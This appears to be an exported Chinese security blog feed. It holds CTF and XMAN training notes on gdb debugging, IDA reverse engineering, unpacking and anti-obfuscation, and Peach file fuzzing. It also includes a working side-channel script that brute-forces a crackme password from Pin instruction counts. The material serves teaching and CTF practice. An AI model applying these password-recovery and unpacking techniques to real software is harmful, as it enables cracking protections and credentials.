<p>这道题很让人苦恼的是，如果gdb中执行run，那么将陷入循环而不能使用vmmap，若强制结束，最后vmmap会报错。这个时候，就有另外的一些办法：</p>
<ul>
<li>执行./pwn &amp;，这个时候会将pwn程序放入后台，而且你能快速知道这个程序的PID，这个时候cat /proc/pwn的PID/maps，就能找到对应的执行时地址。之后kill -9 pwn的PID</li>
<li>编写一个小脚本，任意放置一个断点，并开启gdb调试，这个时候断点会崩溃，但是gdb-peda中使用vmmap仍能找到对应地址</li>
</ul>
]]></content>
      
        <categories>
            
            <category> pwn </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 调试 </tag>
            
            <tag> gdb </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XMAN之旅_逆向基础（下）]]></title>
      <url>/2017/08/03/XMAN%E4%B9%8B%E6%97%85-%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
      <content type="html"><![CDATA[<h3 id="三、-CTF逆向与现实逆向"><a href="#三、-CTF逆向与现实逆向" class="headerlink" title="三、 CTF逆向与现实逆向"></a>三、 CTF逆向与现实逆向</h3><ul>
<li><p>CTF逆向特点</p>
<ul>
<li>代码量小</li>
<li>结构简单<ul>
<li>单文件</li>
</ul>
</li>
<li>编码单一</li>
<li>现代语言特性少<ul>
<li>面向过程</li>
</ul>
</li>
<li>加密壳/优化少</li>
<li>语言常见<ul>
<li>C/C++/ASM</li>
</ul>
</li>
</ul>
</li>
<li><p>现实逆向</p>
<ul>
<li>代码量巨大</li>
<li>结构复杂<ul>
<li>大量静态库、动态库</li>
</ul>
</li>
<li>各种乱码</li>
<li>大量现代语言特性<ul>
<li>OO、Template</li>
</ul>
</li>
<li>优化和加密壳十分常见</li>
<li>语言可能十分神器<ul>
<li>Go/VB/Delphi</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="四、IDA高级使用"><a href="#四、IDA高级使用" class="headerlink" title="四、IDA高级使用"></a>四、IDA高级使用</h3><h4 id="1-设置字符串编码和格式"><a href="#1-设置字符串编码和格式" class="headerlink" title="1. 设置字符串编码和格式"></a>1. 设置字符串编码和格式</h4><ul>
<li>快捷键：<font color="#f00">Alt+A</font></li>
<li>可以设置字符串类型<ul>
<li>Unicode字符串 （WCS）</li>
<li>多字节字符串 （MBS）</li>
<li>其他</li>
</ul>
</li>
<li>可以设置字符串编码<ul>
<li>需要系统支持相应的编码</li>
</ul>
</li>
</ul>
<h4 id="2-导入-导出数据"><a href="#2-导入-导出数据" class="headerlink" title="2. 导入/导出数据"></a>2. 导入/导出数据</h4><ul>
<li>快捷键：<font color="#f00">Shift+E</font></li>
<li>菜单名：<ul>
<li>Edit -&gt; Import Data</li>
<li>Edit -&gt; Export Data</li>
</ul>
</li>
<li>操作：<ul>
<li>选定后按快捷键</li>
</ul>
</li>
<li>方便提取数据或修改idb数据库</li>
</ul>
<h4 id="3-选定大段数据"><a href="#3-选定大段数据" class="headerlink" title="3. 选定大段数据"></a>3. 选定大段数据</h4><ul>
<li>快捷键： <font color="#f00">Alt+L</font></li>
<li><ul>
<li>菜单名：<ul>
<li>Edit -&gt; Begin Selection</li>
</ul>
</li>
</ul>
</li>
<li>将标定选择起始点</li>
<li>滚轮或按g跳转至结束位置</li>
</ul>
<h4 id="4-批量应用类型"><a href="#4-批量应用类型" class="headerlink" title="4. 批量应用类型"></a>4. 批量应用类型</h4><ul>
<li>操作<ul>
<li>设置好第一个类型</li>
<li>利用选定大量数据的方法选定数据</li>
<li>按*或按d弹出建立数组对话框</li>
<li><font color="#f0f">不勾选Create as array</font>

</li>
</ul>
</li>
</ul>
<h4 id="5-设置间接跳转地址"><a href="#5-设置间接跳转地址" class="headerlink" title="5. 设置间接跳转地址"></a>5. 设置间接跳转地址</h4><ul>
<li>快捷键：<font color="#f00">Alt+F11</font></li>
<li>菜单名：<ul>
<li>Edit -&gt; Plugins -&gt; Change the callee address </li>
</ul>
</li>
<li>将利用动态调试获取到的调用/跳转地址填入，可以极大地帮助IDA和F5的分析（不如参数个数、调用约定等），获得更准确的结果</li>
</ul>
<h4 id="6-修复跳转表"><a href="#6-修复跳转表" class="headerlink" title="6. 修复跳转表"></a>6. 修复跳转表</h4><ul>
<li>默认无快捷键，可手动设置</li>
<li>菜单<ul>
<li>Edit -&gt; Other -&gt; Specify switch idiom</li>
</ul>
</li>
<li>当程序在PIE时可能会导致<font color="#f00">跳转表分析失败</font>，于是需要手动修复来获得更好的分析结果</li>
</ul>
<h4 id="7-IDAPython"><a href="#7-IDAPython" class="headerlink" title="7. IDAPython"></a>7. IDAPython</h4><ul>
<li>IDA自带支持的脚本</li>
<li>可以使用几乎所有IDA提供的API</li>
<li>可以快速完成大量重复性操作</li>
<li>可以方便的了解IDA内部的数据和结构</li>
</ul>
<h3 id="五、IDA-F5出错处理"><a href="#五、IDA-F5出错处理" class="headerlink" title="五、IDA F5出错处理"></a>五、IDA F5出错处理</h3><h4 id="1-positive-sp-value"><a href="#1-positive-sp-value" class="headerlink" title="1. positive sp value"></a>1. positive sp value</h4><ul>
<li>成因：IDA会自动分析SP寄存器的变化量，由于缺少调用约定、参数个数等信息，导致分析出错</li>
<li>解决方案<ul>
<li>推荐：在<font color="#f00">Option -&gt; General设置显示Stack pointer</font>，然后去检查对应地址附近调用的函数的调用约定以及栈指针变化</li>
<li>不推荐： 在对应地址处按<font color="#f00">Alt+K</font>，然后输入一个较大的负值（有风险）</li>
</ul>
</li>
</ul>
<h4 id="2-call-analysis-failed"><a href="#2-call-analysis-failed" class="headerlink" title="2. call analysis failed"></a>2. call analysis failed</h4><ul>
<li>成因：F5在分析调用时，未能成功解析<font color="#f00">参数位置/参数个苏</font></li>
<li>解决方案：<ul>
<li>对于间接调用（类似call eax等），可使用之前讲过的<font color="#f0f">设置调用地址</font>的方法解决</li>
<li>对于直接调用，查看<font color="#f0f">调用目标的type</font>是否正确设置。<font color="#f0f">可变参数</font>是引发这种错误的主要原因之一</li>
</ul>
</li>
</ul>
<h4 id="3-cannot-convert-to-microcode"><a href="#3-cannot-convert-to-microcode" class="headerlink" title="3. cannot convert to microcode"></a>3. cannot convert to microcode</h4><ul>
<li>成因：部分指令无法被编译</li>
<li>解决方案：<ul>
<li>最常见起因是函数中<font color="#f0f">有未设置成指令的数据字节</font>，按c将其设置为指令即可</li>
<li>其次常见的是<font color="#f0f">x86中的rep前缀</font>，比如<font color="#f0f">repxx  jmp</font>等。可以将该指令的<font color="#f0f">第一个字节(repxx前缀的对应位置)patch为0x90 (NOP)</font></li>
</ul>
</li>
</ul>
<h4 id="4-stack-frame-is-too-big"><a href="#4-stack-frame-is-too-big" class="headerlink" title="4. stack frame is too big"></a>4. stack frame is too big</h4><ul>
<li>成因：在分析栈帧时，IDA出现异常，导致分析出错</li>
<li>解决方案：<ul>
<li>找到明显不合常理的stack variable offset，双击进入栈帧界面，<font color="#f0f">按u键删除对应的stack variable</font></li>
<li>如果是去壳导致的原因，先用OD等软件脱壳</li>
<li>可能由花指令导致，请手动或自动检查并去除花指令</li>
</ul>
</li>
<li>非常罕见</li>
</ul>
<h4 id="5-local-variable-allocation-failed"><a href="#5-local-variable-allocation-failed" class="headerlink" title="5. local variable allocation failed"></a>5. local variable allocation failed</h4><ul>
<li>成因： 分析函数时，有部分变量对应的区域<font color="#f0f">发生重叠</font>，多见于ARM平台出现Point、Rect等8字节、16字节、32字节结构</li>
<li>解决方案<ul>
<li>修改对应参数为多个int</li>
<li>修改ida安装目录下hexrays.cfg中的HO_IGNORE_OVERLAPS</li>
</ul>
</li>
</ul>
<h4 id="6-F5结果不正确"><a href="#6-F5结果不正确" class="headerlink" title="6. F5结果不正确"></a>6. F5结果不正确</h4><ul>
<li>成因：F5会自动删除其认为不可能到达的死代码</li>
<li>常见起因是一个函数错误的标注为noretur函数</li>
<li>解决方案<ul>
<li>进到目前反编译结果，找到<font color="#f0f">最后被调用的函数(被错误分析的函数)，双击进入（迫使HexRays重新分析相应函数）</font></li>
<li>如果上述方案不成功，那么进到被错误分析的函数，按Tab切换到反汇编界面，按Alt+P进入界面取消函数的Does not return 属性</li>
</ul>
</li>
</ul>
<h3 id="六、IDA-F5高级使用"><a href="#六、IDA-F5高级使用" class="headerlink" title="六、IDA F5高级使用"></a>六、IDA F5高级使用</h3><h4 id="1-自定义寄存器传参"><a href="#1-自定义寄存器传参" class="headerlink" title="1. 自定义寄存器传参"></a>1. 自定义寄存器传参</h4><ul>
<li>使用IDA中的<strong>usercall和</strong>userpurge调用约定（两个下划线）</li>
<li>设置范例<ul>
<li>int __usercall test&lt;eax&gt; (int al &lt;ebx&gt;);</li>
<li>&lt;&gt;中为对应值的位置</li>
<li>第一个&lt;&gt;为返回值位置，注意返回值的位置即使不变也要填写</li>
</ul>
</li>
</ul>
<h4 id="2-HexRays源码级调试"><a href="#2-HexRays源码级调试" class="headerlink" title="2. HexRays源码级调试"></a>2. HexRays源码级调试</h4><ul>
<li>注意<ul>
<li>F5中显示的变量很可能不是变量原来的值，尤其是寄存器变量，尽量在  值位置断下并查看</li>
<li>对于优化后的代码，F5调试bug很多</li>
<li>F5单步不太稳定，在ARM平台可能会跑飞</li>
<li>F5的运行至指定位置功能功能不稳定</li>
</ul>
</li>
</ul>
<h4 id="3-恢复符号"><a href="#3-恢复符号" class="headerlink" title="3. 恢复符号"></a>3. 恢复符号</h4><ul>
<li>找到程序的旧版本<ul>
<li>大量程序早期版本中安全意识薄弱，没有删除符号等各种信息</li>
<li>苹果用户可以在AppAdmin中获取版本应用</li>
</ul>
</li>
<li>Rizzo匹配</li>
<li>看程序自带的String<ul>
<li>许多程序自带大量调试信息，从而可以获取符号</li>
</ul>
</li>
<li>Google搜索源码<ul>
<li>CS、iOS都有被泄露过</li>
<li>按获得信息搜索源码<ul>
<li>大量程序中使用Stack Overflow、CSDN等答案</li>
</ul>
</li>
</ul>
</li>
<li>制作Signtature<ul>
<li>IDA提供自动制作Signature的工具</li>
<li>打开IDASDK68文件夹找到flair 58文件夹</li>
</ul>
</li>
</ul>
<h3 id="七、IDA-插件搞定虚表"><a href="#七、IDA-插件搞定虚表" class="headerlink" title="七、IDA 插件搞定虚表"></a>七、IDA 插件搞定虚表</h3><h4 id="1-虚表简介"><a href="#1-虚表简介" class="headerlink" title="1. 虚表简介"></a>1. 虚表简介</h4><p>虚表是业界难题，虚函数的处理会因编译器采取的ABI的不同而不同</p>
<ul>
<li>IDA操作的插件<ul>
<li>HexraysCodeXplorer</li>
<li>hexrays_tool</li>
<li>HexRaysPyTools</li>
</ul>
</li>
</ul>
<h4 id="2-实验样例"><a href="#2-实验样例" class="headerlink" title="2. 实验样例"></a>2. 实验样例</h4><ul>
<li>快捷键： Shift + F</li>
<li>菜单： 右键 -&gt; Deeo Scan Variable</li>
<li>操作<ul>
<li>在构造函数中执行上述操作、等待扫描完毕</li>
<li>按Alt+F8打开Signature Builder，看到有黄色部分，然后选不正确的field点</li>
<li>清楚所有的黄色部分后即可点击Finalize，在新弹出的窗口中修改名称</li>
</ul>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> xman </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 调试 </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[XMAN之旅_逆向基础（上）]]></title>
      <url>/2017/08/02/XMAN%E4%B9%8B%E6%97%85-%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80%EF%BC%88%E4%B8%8A%EF%BC%89/</url>
      <content type="html"><![CDATA[<p>这堂课是由Nu1L著名队员Misty所讲，内容很多，范围很广，是作为逆向的基础入门知识——实际上内容还是有点难度的。</p>
<h3 id="一、-初级工具使用"><a href="#一、-初级工具使用" class="headerlink" title="一、 初级工具使用"></a>一、 初级工具使用</h3><p><br></p>
<h4 id="1-二进制编辑器"><a href="#1-二进制编辑器" class="headerlink" title="1. 二进制编辑器"></a>1. 二进制编辑器</h4><p>Misty作为一位资深的逆向大佬，向我们推荐了两款好用的二进制编辑器：010Editor 和 Editplus</p>
<p>010 Editor是文本/十六进制编辑器，还包括文件解析、计算器、文本比较等功能。其可以通过官方网站提供的脚本(Binary Template)对avi、bmp、png、exe等简单格式的文件进行解析，当然也可以根据需求来自己编写文件解析脚本。</p>
<p>010Editor的文本解析功能，方便了我们分析文件，理清文件内容。</p>
<p>Editplus则是Misty的二次元之心作祟，要支持各种编码，这个确实是不错的选择。</p>
<h4 id="2-可执行文件查看"><a href="#2-可执行文件查看" class="headerlink" title="2. 可执行文件查看"></a>2. 可执行文件查看</h4><p>对于这部分，我的感触就是看书，看《加密与解密(第三版)》-看雪安全论坛</p>
<p>PE: CFF Explorer<br>MachO: MachOView<br>ELF: IDA</p>
<h4 id="3-格式转换工具"><a href="#3-格式转换工具" class="headerlink" title="3. 格式转换工具"></a>3. 格式转换工具</h4><p>推荐使用shellcode helper</p>
<h4 id="4-反汇编器"><a href="#4-反汇编器" class="headerlink" title="4. 反汇编器"></a>4. 反汇编器</h4><p>推荐使用IDA<br>IDA的功能十分强大，而且其超前的意识也让它被大家广泛使用！</p>
<ul>
<li>界面转换<ul>
<li>d: 设置Data（多次使用可以在1字节、2字节、4字节、8字节间转换）</li>
<li>c: 设置Code</li>
<li>x: Cross Reference</li>
<li>Shift+F12：查看所有字符串</li>
</ul>
</li>
<li>反编译器使用<ul>
<li>y：设置类型（变量、函数）、设置Calling Conversion</li>
</ul>
</li>
<li>其他快捷键<ul>
<li>N：对（变量、函数）重命名</li>
</ul>
</li>
</ul>
<h4 id="5-调试器"><a href="#5-调试器" class="headerlink" title="5. 调试器"></a>5. 调试器</h4><ul>
<li><p>命令行调试器有：</p>
<ul>
<li>gdb: 用于linux等多种系统中</li>
<li>windbg：用于windows调试</li>
</ul>
</li>
<li><p>图形界面调试器：</p>
<ul>
<li>OllyDbg：调试win32程序</li>
<li>x64_dbg：调试win32/64程序</li>
<li>IDA内置调试器</li>
</ul>
</li>
</ul>
<h4 id="6-搭建调试环境"><a href="#6-搭建调试环境" class="headerlink" title="6. 搭建调试环境"></a>6. 搭建调试环境</h4><p>在IDA PRO中有dbgsrv文件夹。里面放置了一些远程可执行程序。只需要在远程启用这些程序，就可以在本地远程调试。</p>
<h4 id="6-去除软件保护"><a href="#6-去除软件保护" class="headerlink" title="6. 去除软件保护"></a>6. 去除软件保护</h4><ul>
<li>侦壳<ul>
<li>PEiD、ExeInfo</li>
</ul>
</li>
<li>脱壳<ul>
<li>搜索脱壳机（比较多的有upx、ASPack。对于upx，推荐使用upx shell）</li>
<li>ESP定律快速脱壳<ul>
<li>原理：脱壳前后位置不变</li>
<li>适用环境：只针对压缩壳</li>
<li>范例：<br>首先进入程序，并设置ESP处的硬件断点，如图所示<br><img src="/images/2017-08-02/first.png" alt="first"><br>然后运行至硬件断点处，发现后面有个长跳转，在其位置上设置断点<br><img src="/images/2017-08-02/second.jpg" alt="second"><br>最后运行至长跳转位置处，然后直接步进，进入程序的正式入口，选用插件OllyDump，设置起始地址和入口点修正地址，然后脱壳即可！<br><img src="/images/2017-08-02/third.jpg" alt="third"></li>
</ul>
</li>
</ul>
</li>
<li>去除花指令<ul>
<li>使用OllyDbg脚本</li>
<li>手动总结特征码，然后修改</li>
</ul>
</li>
<li>去除混淆<ul>
<li>.net反混淆器 de4dot</li>
</ul>
</li>
</ul>
<h4 id="7-定位验证代码"><a href="#7-定位验证代码" class="headerlink" title="7. 定位验证代码"></a>7. 定位验证代码</h4><ul>
<li><p>任务：</p>
<ul>
<li>破除保护外壳</li>
<li>理解程序逻辑</li>
<li>找到验证函数</li>
<li>逆推获取flag</li>
</ul>
</li>
<li><p>方法</p>
<ul>
<li>正向（从main开始）</li>
<li>逆向（从输入输出函数回溯）</li>
</ul>
</li>
</ul>
<h3 id="二、-逆向方法总结"><a href="#二、-逆向方法总结" class="headerlink" title="二、 逆向方法总结"></a>二、 逆向方法总结</h3><h4 id="1-算法分析与逆向"><a href="#1-算法分析与逆向" class="headerlink" title="1. 算法分析与逆向"></a>1. 算法分析与逆向</h4><ul>
<li>没算法（签到题）</li>
<li>常见算法<ul>
<li>简单异或</li>
<li>带雪崩效应的异或（CBC）</li>
<li>加密算法（RSA、AES）<ul>
<li>RSA中会引用大数库函数</li>
<li>AES如果出得简单，那么解密函数应该在程序中，否则就得理清程序逻辑</li>
</ul>
</li>
<li>散列算法（MD5、SHA1）<ul>
<li>MD5中会出现常数，所以应该会有0123456789ABCDEF这一串数</li>
<li>SHA1中也会出现常数，google一下就能判断</li>
</ul>
</li>
<li>解方程<ul>
<li>推荐使用z3，使用时注意与python配合，十分简单</li>
<li>python的数学运算库</li>
</ul>
</li>
</ul>
</li>
<li>有趣的算法<ul>
<li>走迷宫</li>
</ul>
</li>
</ul>
<h4 id="2-边信道攻击-side-channel-attack-简称SCA"><a href="#2-边信道攻击-side-channel-attack-简称SCA" class="headerlink" title="2. 边信道攻击(side channel attack 简称SCA)"></a>2. 边信道攻击(side channel attack 简称SCA)</h4><p>原理： 检测程序执行的行指令数、<br>应用：逐字节验证的题目</p>
<p><b>范例：采用codegate-preliminary-2014/dodocrackme/</b></p>
<pre><code>$ file crackme 
crackme: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, BuildID[sha1]=92ef00b31d91a827a5aed6b0fe03fe38fe20fb4d, stripped
$ ./crackme 
root@localhost's password: bla
Permission denied (password).
$ objdump -d crackme | wc -l
15809
</code></pre>

<p>我们使用pin进行测试得到：</p>
<pre><code>$ pin -t inscount0 -o out -- ./crackme ; cat out
root@localhost's password: a
Permission denied (password).
Count 715821
$ pin -t inscount0 -o out -- ./crackme ; cat out
root@localhost's password: b
Permission denied (password).
Count 716328
$ pin -t inscount0 -o out -- ./crackme ; cat out
root@localhost's password: c
Permission denied (password).
Count 716835
$ bc -lq
716328 -715821
507
716835 - 716328
507
</code></pre>

<p>使用所有可见字符，最后得到的测试结果如下：</p>
<pre><code>$ python bf.py 
Input [!] -> [717933] delta [507]
Input ["] -> [718440] delta [507]
Input [#] -> [718947] delta [507]
Input [$] -> [719454] delta [507]
Input [%] -> [719961] delta [507]
Input [&] -> [720468] delta [507]
Input ['] -> [720975] delta [507]
Input [(] -> [721482] delta [507]
Input [)] -> [721989] delta [507]
Input [*] -> [722496] delta [507]
Input [+] -> [723003] delta [507]
Input [,] -> [723510] delta [507]
Input [-] -> [724017] delta [507]
Input [.] -> [724524] delta [507]
Input [/] -> [725031] delta [507]
Input [0] -> [725538] delta [507]
Input [1] -> [726045] delta [507]
Input [2] -> [726552] delta [507]
Input [3] -> [727059] delta [507]
Input [4] -> [727566] delta [507]
Input [5] -> [728073] delta [507]
Input [6] -> [728580] delta [507]
Input [7] -> [729087] delta [507]
Input [8] -> [729594] delta [507]
Input [9] -> [730101] delta [507]
Input [:] -> [730608] delta [507]
Input [;] -> [731115] delta [507]
Input [<] -=""> [731622] delta [507]
Input [=] -> [732129] delta [507]
Input [>] -> [732636] delta [507]
Input [?] -> [733143] delta [507]
Input [@] -> [733650] delta [507]
Input [A] -> [734157] delta [507]
Input [B] -> [734664] delta [507]
Input [C] -> [735171] delta [507]
Input [D] -> [735678] delta [507]
Input [E] -> [736185] delta [507]
Input [F] -> [736692] delta [507]
Input [G] -> [737199] delta [507]
Input [H] -> [701989] delta [-35210]
Input [I] -> [703653] delta [1664]
Input [J] -> [704160] delta [507]
Input [K] -> [704667] delta [507]
Input [L] -> [705174] delta [507]
Input [M] -> [705681] delta [507]
Input [N] -> [706188] delta [507]
Input [O] -> [706695] delta [507]
Input [P] -> [707202] delta [507]
Input [Q] -> [707709] delta [507]
Input [R] -> [708216] delta [507]
Input [S] -> [708723] delta [507]
Input [T] -> [709230] delta [507]
Input [U] -> [709737] delta [507]
Input [V] -> [710244] delta [507]
Input [W] -> [710751] delta [507]
Input [X] -> [711258] delta [507]
Input [Y] -> [711765] delta [507]
Input [Z] -> [712272] delta [507]
Input [[] -> [712779] delta [507]
Input [\] -> [713286] delta [507]
Input []] -> [713793] delta [507]
Input [^] -> [714300] delta [507]
Input [_] -> [714807] delta [507]
Input [`] -> [715314] delta [507]
Input [a] -> [715821] delta [507]
Input [b] -> [716328] delta [507]
Input [c] -> [716835] delta [507]
Input [d] -> [717342] delta [507]
Input [e] -> [717849] delta [507]
Input [f] -> [718356] delta [507]
Input [g] -> [718863] delta [507]
Input [h] -> [719370] delta [507]
Input [i] -> [719877] delta [507]
Input [j] -> [720384] delta [507]
Input [k] -> [720891] delta [507]
Input [l] -> [721398] delta [507]
Input [m] -> [721905] delta [507]
Input [n] -> [722412] delta [507]
Input [o] -> [722919] delta [507]
Input [p] -> [723426] delta [507]
Input [q] -> [723933] delta [507]
Input [r] -> [724440] delta [507]
Input [s] -> [724947] delta [507]
Input [t] -> [725454] delta [507]
Input [u] -> [725961] delta [507]
Input [v] -> [726468] delta [507]
Input [w] -> [726975] delta [507]
Input [x] -> [727482] delta [507]
Input [y] -> [727989] delta [507]
Input [z] -> [728496] delta [507]
Input [{] -> [729003] delta [507]
Input [|] -> [729510] delta [507]
Input [}] -> [730017] delta [507]
Input [~] -> [730524] delta [507]
</]></code></pre>

<p>于是得到首字母为H</p>
<p>我们使用下面的脚本进行测试，得到结果：</p>
<pre><code>#!/usr/bin/python
import os, pexpect, time
from subprocess import Popen,PIPE

pinpath="/ctf/TOOLS/pin/pin"

def try_list(lst):
    procs = {}
    ret_dict = {}
    for (idx, s) in enumerate(lst):
        out_file = s.encode('hex')
        p = Popen([pinpath, "-t", "inscount0", "-o", "tmp/" + out_file, "--", "./crackme"], stdout = PIPE, stdin = PIPE)
        procs[s] = p
        p.stdin.write(s + "\n")

    prev = 0
    show_delta = False
    delta = {}
    for (idx,s) in enumerate(lst):
        while procs[s].poll() is None:
            time.sleep(0.5)
        if "denied" not in procs[s].stdout.read():
            print "Output different for password [%s]" % s
            exit(-1)
        out_file = s.encode('hex')
        output = open("tmp/" + out_file).read().split(" ")[1].strip()
        instr_count = int(output)
        if show_delta:
            #print "Input [%s] -> [%s] delta [%s]" % (s, instr_count, instr_count - prev)
            delta[s] = instr_count - prev
        else:
            show_delta = True
        prev = instr_count

    for (idx,s) in enumerate(lst):
        if idx < 2:
            continue
        if delta[s] != delta[lst[idx-1]]:
            return s

prefix = ""
while True:
    lst = [prefix + chr(i) for i in range(32,127)]
    prefix = try_list(lst)
    print "Trying input -> %s" % prefix

</code></pre>

<h4 id="3-逆向小技巧"><a href="#3-逆向小技巧" class="headerlink" title="3. 逆向小技巧"></a>3. 逆向小技巧</h4><ul>
<li>快速找main入口<ul>
<li>寻找一个<font color="#f00">大跳转</font></li>
</ul>
</li>
<li>快速定位关键位置<ul>
<li>从Function List靠前位置开始乱翻<ul>
<li>编译时不同源文件会被分别编译为.o，再由编译器合并</li>
<li>编译命令行中标准库一般在最前面</li>
</ul>
</li>
<li>从main函数旁边翻</li>
</ul>
</li>
<li>应对MFC程序<ul>
<li>使用xspy工具查看消息处理函数<ul>
<li>将xspy上的放大镜拖到感兴趣的函数（如OnClick、OnCommand等</li>
</ul>
</li>
</ul>
</li>
<li>手动加载Signature<ul>
<li>碰到无法自动识别库函数时<ul>
<li>Shift+F5: View -&gt; Open Subviews -&gt; Signatures (注意要选择好Library，如果使用mfc，就应该选择vc32mfc文件)</li>
<li>Shift+F11: View -&gt; Open Subviews -&gt; Type Libraries</li>
</ul>
</li>
</ul>
</li>
<li>如何得知MessageBox弹框后，程序在哪继续进行<ul>
<li>在OD或x64dbg中找到内存布局列表<ul>
<li>OD：<font color="#f00">Alt+M</font> -&gt; 内存</li>
<li>x64dbg：在窗口栏点击<font color="#f00">内存布局</font></li>
</ul>
</li>
<li>找到自己程序的代码段（通常是本程序的.text，按F2，<font color="#f00">设置区断点</font>）</li>
<li>返回程序点击确定即可</li>
</ul>
</li>
</ul>
]]></content>
      
        <categories>
            
            <category> xman </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 调试 </tag>
            
            <tag> 汇编 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[文件类型漏洞挖掘与Smart Fuzz]]></title>
      <url>/2017/07/28/%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E4%B8%8ESmart-Fuzz/</url>
      <content type="html"><![CDATA[<h3 id="1-Smart-Fuzz"><a href="#1-Smart-Fuzz" class="headerlink" title="1. Smart Fuzz"></a>1. Smart Fuzz</h3><h4 id="1-1-文件格式Fuzz的基本方法"><a href="#1-1-文件格式Fuzz的基本方法" class="headerlink" title="1.1 文件格式Fuzz的基本方法"></a>1.1 文件格式Fuzz的基本方法</h4><p>不管IE还是Office，都有一个共同点，就是用文件作为程序的主要输入。从本质上讲，这些软件都是按照事先约定好的数据结构对文件中不同的数据域进行解析，以决定用什么颜色、在什么位置显示这些数据。</p>
<p>文件格式Fuzz（File Fuzz）就是利用“畸形文件”测试软件鲁棒性的方法。</p>
<p>File Fuzz工具的工作流程大体如下：</p>
<ol>
<li>以正常的文件模板为基础，按照一定规则生成一批畸形文件</li>
<li>将畸形文件逐一送入软件进行解析，并监视软件是否会抛出异常</li>
<li>记录软件产生的错误星系，如寄存器状态、栈状态等</li>
<li>用日志或其他UI形式向测试人员展示异常信息，以进一步鉴定这些错误是否能被利用</li>
</ol>
<p><img src="/images/2017-07-28/file_fuzz.jpg" alt="File Fuzz的一般步骤"></p>
<h4 id="1-2-Blind-Fuzz和Smart-Fuzz"><a href="#1-2-Blind-Fuzz和Smart-Fuzz" class="headerlink" title="1.2 Blind Fuzz和Smart Fuzz"></a>1.2 Blind Fuzz和Smart Fuzz</h4><p>Blind Fuzz就是“盲测”，也即在随机位置插入随机的数据以生成畸形文件。现代软件往往使用非常复杂的数据结构，而数据结构越复杂，解析逻辑越复杂，就越容易出现漏洞。复杂的数据结构有以下特征：</p>
<ol>
<li>拥有一批预定义的静态数据，如magic、cmd id等</li>
<li>数据结构的内容是可以动态改变的</li>
<li>数据结构之间是嵌套的 </li>
<li>数据中存在多种数据关系（size of, point to, reference of, CRC）</li>
<li>有意义的数据被编码或压缩，甚至用另一种文件形式来存储。</li>
</ol>
<p>对于复杂数据结构的复杂文件进行漏洞挖掘，若用Blind Fuzz，则产生测试用例的策略缺少针对性，生成大量无效测试用例，难以发现复杂解析器深层逻辑的漏洞等。</p>
<p>Smart Fuzz的特征：</p>
<ol>
<li>面向逻辑（Logic Oriented Fuzzing）：目标是解析文件的程序逻辑。即明确测试“深度”以及畸形数据的测试“粒度”。</li>
<li>面向数据类型测试（Data Type Oriented Fuzzing）<ul>
<li>算术型，以HEX、ASCII、Unicode、Raw格式存在的各种数值</li>
<li>指针型，Null指针、合法/非法的内存指针等</li>
<li>字符串型，超长字符串、缺少终止符(0x00)的字符串等</li>
<li>特殊字符，#,@,*,&lt;,&gt;,/,\,../等</li>
</ul>
</li>
<li>基于样本（Sample Based Fuzzing）：首先构造合法的样本文件（模板文件），然后以这个文件为模板，每次只改动小部分数据和逻辑来生成畸形文件，这也叫做变异（Mutation）</li>
</ol>
<h3 id="2-用Peach挖掘文件漏洞"><a href="#2-用Peach挖掘文件漏洞" class="headerlink" title="2. 用Peach挖掘文件漏洞"></a>2. 用Peach挖掘文件漏洞</h3><h4 id="2-1-Peach-介绍与安装"><a href="#2-1-Peach-介绍与安装" class="headerlink" title="2.1 Peach 介绍与安装"></a>2.1 Peach 介绍与安装</h4><p>Peach是一款用Python写的开源Smart Fuzz工具，其支持两种文件Fuzz方法：基于生长(Generation Based)和基于变异(Mutation Based)。基于生长的Fuzz方法产生随机或启发性数据来填充给定的数据模型，从而生成畸形文件。基于变异的Fuzz方法在一个给定的样本文件基础上进行修改从而产生畸形文件。</p>
<h4 id="2-2-XML介绍"><a href="#2-2-XML介绍" class="headerlink" title="2.2 XML介绍"></a>2.2 XML介绍</h4><p>XML即&quot;Extensible Generalized Markup Language&quot;，可扩展标记性语言；其与HTML一样都是标准通用标记性语言（Standard Generalized Markup Language, SGML）</p>
<p>XML分为文件序言(Prolog)和文件主体两大部分。文件序言为XML第一行，告诉解析器该如何工作（例如：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;）。其中version是XML文件所用的标准版本号，必须要有：encoding标明此XML文件的编码类型，如果是Unicode编码时则可以省略。文件主体分为以下几个部分：</p>
<ol>
<li>元素(Element)：&lt;title&gt; lang=&quot;cn&quot;&gt;XML&lt;/title&gt;</li>
<li>标签(Tag)：&lt;tile&gt;</li>
<li>属性(Attribute)：lang就是&lt;title&gt;的属性</li>
<li>根元素(Root Element)：又称文档元素。起始标签</li>
<li>注释(Comment)：&lt;!-- --!&gt;来注释</li>
</ol>
<h4 id="2-3-定义简单的Peach-Pit"><a href="#2-3-定义简单的Peach-Pit" class="headerlink" title="2.3 定义简单的Peach Pit"></a>2.3 定义简单的Peach Pit</h4><p>Peach Pit文件包括以下5个模块：</p>
<ol>
<li>GeneralConf</li>
<li>DataModel</li>
<li>StateModel</li>
<li>Agents and Monitors</li>
<li>Test and Run Configuration</li>
</ol>
<p>所有元素都包含在根元素&lt;Peach&gt;里</p>
<pre><code>&lt;?xml version="1.0" encoding="utf-8" ?&gt;
&lt;Peach xmlns="http://phed.org/2008/Peach" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:schemaLocation="http://phed.org/2008/Peach ../peach.xsd" version="1.0"&gt;
</code></pre>

<p>上面的Peach元素的各个属性基本上是固定的，不要轻易改动</p>
<p>一、 GeneralConf<br>GeneralConf是Peach Pit文件的第一部分，用来定义基本配置信息。包括:</p>
<pre><code>* include: 要包含的其他Peach Pit文件
